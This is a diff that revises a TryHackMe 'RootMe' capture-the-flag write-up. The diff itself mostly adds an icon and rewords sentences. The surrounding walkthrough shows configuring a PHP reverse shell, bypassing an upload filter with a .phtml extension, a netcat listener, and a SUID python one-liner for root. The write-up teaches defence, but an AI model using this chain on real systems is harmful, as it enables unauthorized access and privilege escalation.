@@ -4,6 +4,7 @@
     <b>Difficulty:</b> Easy<br>
     <b>Status:</b> Completed ✅<br>
     <b>URL:</b> <a href="https://tryhackme.com/room/rrootme">RootMe</a><br>
+    <b>Icon:</b> <img src="RootMe.png" width="32"><br>
     <b>Date:</b> February 27, 2026<br>
     <b>Tags:</b> #tryhackme #easy #thm
   </sub>
@@ -56,7 +57,7 @@ I grabbed pentestmonkey's PHP reverse shell from GitHub:
 
 > https://github.com/pentestmonkey/php-reverse-shell
 
-Made it executable and opened it in an editor to update the IP and port:
+I opened it in an editor and updated the connection details:
 
 - `$ip` → `10.10.110.118`
 - `$port` → `9001`
@@ -65,7 +66,7 @@ When I tried uploading the `.php` file directly, the server rejected it:
 
 ![Screenshot 3](screenshot_03.png)
 
-The upload filter was blocking `.php` extensions. To bypass this, I renamed the file to use a `.phtml` extension, which PHP still executes but wasn't caught by the filter:
+The upload filter was blocking `.php` extensions. To bypass this, I renamed the file to use a `.phtml` extension — PHP still executes it, but the filter didn't catch it:
 
 ```bash
 mv php_reverse_shell.php php_reverse_shell.phtml
@@ -81,9 +82,7 @@ With the shell uploaded, I started a Netcat listener:
 nc -lvnp 9001
 ```
 
-I then navigated to `10.10.110.118/uploads`, clicked the uploaded shell, and caught the connection — we had a shell.
-
-To stabilise the shell I spawned a proper TTY using Python:
+I then navigated to `10.10.110.118/uploads`, clicked the uploaded shell, and caught the connection. To stabilise the shell I spawned a proper TTY using Python:
 
 ```bash
 which python
@@ -106,13 +105,13 @@ With a foothold established, I searched for SUID binaries to find a privilege es
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-This flagged `/usr/bin/python` as SUID — meaning it runs with the owner's privileges (root). I exploited this with a standard `os.execl` technique to drop into a root shell:
+This flagged `/usr/bin/python` as SUID — meaning it runs with the owner's privileges (root). I exploited this using a standard `os.execl` technique to drop into a root shell:
 
 ```bash
 /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
 
-The `-p` flag preserves the elevated privileges, giving a root shell.
+The `-p` flag preserves the elevated privileges, giving a full root shell.
 
 ---
 
@@ -127,8 +126,8 @@ The `-p` flag preserves the elevated privileges, giving a root shell.
 ## 🧩 Key Takeaways
 
 - **Extension filtering alone isn't enough** — alternate extensions like `.phtml` are often overlooked and still interpreted as PHP by the server. A proper allowlist approach (rather than a blocklist) is the fix.
-- **SUID on interpreters is dangerous** — granting SUID to binaries like Python gives any user a trivial path to root. GTFOBins covers dozens of these.
-- Always check for SUID binaries early in the privilege escalation phase — `find / -perm -u=s -type f 2>/dev/null` should be a standard step.
+- **SUID on interpreters is dangerous** — granting SUID to binaries like Python gives any user a trivial path to root. GTFOBins covers dozens of these cases.
+- Always check for SUID binaries early in the privilege escalation phase — `find / -perm -u=s -type f 2>/dev/null` should be a standard step in any Linux enumeration.
 
 ---
 
